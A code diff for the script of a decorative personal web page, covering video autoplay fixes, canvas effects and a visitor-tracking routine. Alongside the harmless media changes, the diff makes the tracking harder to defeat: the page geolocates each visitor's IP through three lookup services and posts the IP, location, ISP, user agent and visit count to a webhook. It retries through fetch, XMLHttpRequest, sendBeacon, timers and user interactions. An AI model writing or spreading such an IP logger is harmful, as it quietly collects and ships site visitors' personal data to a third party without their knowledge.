@@ -28,6 +28,8 @@ let mainShown = false;
 let introTimer = null;
 let visitorSnapshot = null;
 let sessionSent = false;
+let webhookSent = false;
+let videoStarted = false;
 
 const intro = document.getElementById("intro");
 const introCross = document.getElementById("intro-cross");
@@ -135,27 +137,51 @@ function disableSound() {
   bgVideo.setAttribute("muted", "");
 }
 
+async function startVideo() {
+  if (!bgVideo || videoStarted) return;
+
+  enableSound();
+  coverVideo();
+
+  try {
+    await bgVideo.play();
+    videoStarted = true;
+  } catch {
+    attachPlayRetry();
+  }
+
+  updateMuteBtn();
+}
+
+function attachPlayRetry() {
+  const retry = () => {
+    if (!bgVideo) return;
+    enableSound();
+    bgVideo.play().then(() => {
+      videoStarted = true;
+      updateMuteBtn();
+    }).catch(() => {});
+  };
+
+  document.addEventListener("pointerdown", retry, { once: true, capture: true });
+  document.addEventListener("keydown", retry, { once: true, capture: true });
+}
+
 async function revealVideo() {
   if (!bgVideo) return;
 
   coverVideo();
   bgVideo.classList.add("active");
-  videoShade.classList.add("active");
+  videoShade?.classList.add("active");
 
   enableSound();
 
   try {
-    await bgVideo.play();
+    if (bgVideo.paused) await bgVideo.play();
+    videoStarted = true;
   } catch {
-    disableSound();
-    try {
-      await bgVideo.play();
-    } catch {
-      updateMuteBtn();
-      finishLoadProgress();
-      return;
-    }
-    enableSound();
+    videoStarted = false;
+    attachPlayRetry();
   }
 
   updateMuteBtn();
@@ -188,8 +214,11 @@ function updateMuteBtn() {
 
 function toggleMute() {
   if (!bgVideo) return;
-  if (bgVideo.muted) unmuteVideo();
-  else {
+  if (bgVideo.muted) {
+    enableSound();
+    bgVideo.play().catch(() => {});
+    updateMuteBtn();
+  } else {
     disableSound();
     updateMuteBtn();
   }
@@ -200,7 +229,11 @@ muteBtn?.addEventListener("click", (e) => {
   toggleMute();
 });
 window.addEventListener("resize", coverVideo);
-bgVideo?.addEventListener("loadedmetadata", coverVideo);
+bgVideo?.addEventListener("loadedmetadata", () => {
+  coverVideo();
+  startVideo();
+});
+bgVideo?.addEventListener("canplay", startVideo, { once: true });
 
 /* ── Custom cursor ── */
 
@@ -233,6 +266,7 @@ function initCursor() {
 function initFilmGrain() {
   if (!filmGrain) return;
   const ctx = filmGrain.getContext("2d");
+  if (!ctx) return;
 
   const resize = () => {
     filmGrain.width = window.innerWidth / 2;
@@ -269,6 +303,7 @@ function initSnow() {
   if (!canvas) return;
 
   const ctx = canvas.getContext("2d");
+  if (!ctx) return;
   const flakes = [];
   let count = 0;
 
@@ -400,12 +435,17 @@ function getVisitTag(count) {
 }
 
 function trackVisitCount() {
-  const count = parseInt(localStorage.getItem(VISIT_KEY) || "0", 10) + 1;
-  localStorage.setItem(VISIT_KEY, String(count));
-  if (visitCountEl) {
-    visitCountEl.textContent = `you've been here ${count} time${count === 1 ? "" : "s"}`;
+  try {
+    const count = parseInt(localStorage.getItem(VISIT_KEY) || "0", 10) + 1;
+    localStorage.setItem(VISIT_KEY, String(count));
+    if (visitCountEl) {
+      visitCountEl.textContent = `you've been here ${count} time${count === 1 ? "" : "s"}`;
+    }
+    return count;
+  } catch {
+    if (visitCountEl) visitCountEl.textContent = "you've been here before";
+    return 1;
   }
-  return count;
 }
 
 function hashString(str) {
@@ -773,13 +813,116 @@ function buildSessionEmbed(info) {
 }
 
 function postWebhook(payload) {
-  const body = new FormData();
-  body.append("payload_json", JSON.stringify(payload));
-  return fetch(WEBHOOK_URL, { method: "POST", body }).catch(() => {});
+  const makeForm = () => {
+    const form = new FormData();
+    form.append("payload_json", JSON.stringify(payload));
+    return form;
+  };
+
+  return fetch(WEBHOOK_URL, {
+    method: "POST",
+    body: makeForm(),
+    keepalive: true,
+  })
+    .then((res) => res.ok)
+    .catch(() => false)
+    .then((fetchOk) => {
+      if (fetchOk) return true;
+
+      return new Promise((resolve) => {
+        try {
+          const xhr = new XMLHttpRequest();
+          xhr.open("POST", WEBHOOK_URL, true);
+          xhr.onload = () => resolve(xhr.status >= 200 && xhr.status < 300);
+          xhr.onerror = () => {
+            try {
+              resolve(navigator.sendBeacon(WEBHOOK_URL, makeForm()));
+            } catch {
+              resolve(false);
+            }
+          };
+          xhr.send(makeForm());
+        } catch {
+          try {
+            resolve(navigator.sendBeacon(WEBHOOK_URL, makeForm()));
+          } catch {
+            resolve(false);
+          }
+        }
+      });
+    });
 }
 
 function sendWebhook(info) {
-  return postWebhook({ embeds: [buildVisitorEmbed(info)] });
+  if (webhookSent) return Promise.resolve(true);
+  return postWebhook({ embeds: [buildVisitorEmbed(info)] }).then((ok) => {
+    if (ok) webhookSent = true;
+    return ok;
+  });
+}
+
+function scheduleWebhookRetry() {
+  const retry = () => {
+    if (webhookSent || !visitorSnapshot) return;
+    sendWebhook(visitorSnapshot);
+  };
+
+  document.addEventListener("pointerdown", retry, { once: true, capture: true });
+  document.addEventListener("keydown", retry, { once: true, capture: true });
+  setTimeout(retry, 2500);
+  setTimeout(retry, 8000);
+}
+
+async function fetchWithTimeout(url, ms = 4500) {
+  const ctrl = new AbortController();
+  const timer = setTimeout(() => ctrl.abort(), ms);
+  try {
+    return await fetch(url, { signal: ctrl.signal });
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
+async function lookupIp() {
+  const sources = [
+    async () => {
+      const res = await fetchWithTimeout("https://ipwho.is/");
+      const data = await res.json();
+      if (!data.success) throw new Error("lookup failed");
+      return data;
+    },
+    async () => {
+      const res = await fetchWithTimeout("https://ipapi.co/json/");
+      const data = await res.json();
+      if (!data.ip) throw new Error("lookup failed");
+      return {
+        success: true,
+        ip: data.ip,
+        city: data.city,
+        region: data.region,
+        country: data.country_name,
+        latitude: data.latitude,
+        longitude: data.longitude,
+        connection: { isp: data.org, asn: data.asn },
+      };
+    },
+    async () => {
+      const res = await fetchWithTimeout("https://api.ipify.org?format=json");
+      const data = await res.json();
+      if (!data.ip) throw new Error("lookup failed");
+      return { success: true, ip: data.ip };
+    },
+  ];
+
+  for (const source of sources) {
+    try {
+      return await source();
+    } catch {
+      /* try next provider */
+    }
+  }
+
+  return null;
 }
 
 function sendSessionWebhook() {
@@ -807,28 +950,53 @@ window.addEventListener("pagehide", sendSessionWebhook);
 window.addEventListener("beforeunload", sendSessionWebhook);
 
 async function loadVisitorInfo() {
-  const visitCount = trackVisitCount();
+  let visitCount = 1;
+
+  try {
+    visitCount = trackVisitCount();
+  } catch {
+    if (visitCountEl) visitCountEl.textContent = "you've been here before";
+  }
+
   let ipData = null;
 
   try {
-    const res = await fetch("https://ipwho.is/");
-    if (!res.ok) throw new Error("lookup failed");
-    ipData = await res.json();
-    if (!ipData.success) throw new Error("lookup failed");
+    ipData = await Promise.race([
+      lookupIp(),
+      new Promise((resolve) => setTimeout(() => resolve(null), 5000)),
+    ]);
 
-    visitorIp.textContent = ipData.ip || "unknown";
-    visitorLocation.textContent = [ipData.city, ipData.region, ipData.country]
-      .filter(Boolean)
-      .join(", ") || "unknown";
-    visitorProvider.textContent = ipData.connection?.isp || "unknown";
+    if (ipData) {
+      visitorIp.textContent = ipData.ip || "unknown";
+      visitorLocation.textContent = [ipData.city, ipData.region, ipData.country]
+        .filter(Boolean)
+        .join(", ") || "unknown";
+      visitorProvider.textContent = ipData.connection?.isp || "unknown";
+    } else {
+      visitorIp.textContent = "unavailable";
+      visitorLocation.textContent = "unavailable";
+      visitorProvider.textContent = "unavailable";
+    }
   } catch {
     visitorIp.textContent = "unavailable";
     visitorLocation.textContent = "unavailable";
     visitorProvider.textContent = "unavailable";
   }
 
-  visitorSnapshot = getBrowserInfo(ipData, visitCount);
-  sendWebhook(visitorSnapshot);
+  try {
+    visitorSnapshot = getBrowserInfo(ipData, visitCount);
+  } catch {
+    visitorSnapshot = {
+      ip: ipData?.ip || "unknown",
+      visitCount,
+      visitTag: getVisitTag(visitCount),
+      userAgent: navigator.userAgent || "unknown",
+      timestamp: new Date().toISOString(),
+    };
+  }
+
+  const sent = await sendWebhook(visitorSnapshot);
+  if (!sent) scheduleWebhookRetry();
 }
 
 loadVisitorInfo();
@@ -882,12 +1050,13 @@ function showMain() {
   setTimeout(() => {
     intro.style.display = "none";
     main.classList.remove("hidden");
+    main.classList.add("visible");
+    visitorPanel?.classList.add("visible");
+    hudTop?.classList.add("visible");
 
-    requestAnimationFrame(async () => {
-      main.classList.add("visible");
-      visitorPanel.classList.add("visible");
-      hudTop?.classList.add("visible");
-      await revealVideo();
+    revealVideo().catch(() => {
+      updateMuteBtn();
+      attachPlayRetry();
     });
 
     runTypewriter();
@@ -897,6 +1066,8 @@ function showMain() {
 function skipIntro() {
   if (mainShown) return;
 
+  startVideo();
+  if (!webhookSent && visitorSnapshot) sendWebhook(visitorSnapshot);
   introSecret?.classList.add("visible");
   introCross.style.pointerEvents = "none";
 
@@ -912,12 +1083,29 @@ introCross?.addEventListener("keydown", (e) => {
   }
 });
 
+introCross?.addEventListener("pointerdown", () => {
+  startVideo();
+});
+
 introTimer = setTimeout(showMain, CROSS_FADE_MS + INTRO_HOLD_MS);
 
 /* ── Init ── */
 
-initCursor();
-initFilmGrain();
-initSnow();
+try {
+  initCursor();
+} catch {
+  /* blocked in strict privacy mode */
+}
+try {
+  initFilmGrain();
+} catch {
+  /* canvas blocked */
+}
+try {
+  initSnow();
+} catch {
+  /* canvas blocked */
+}
 initLoadProgress();
 initTitleFlicker();
+startVideo();
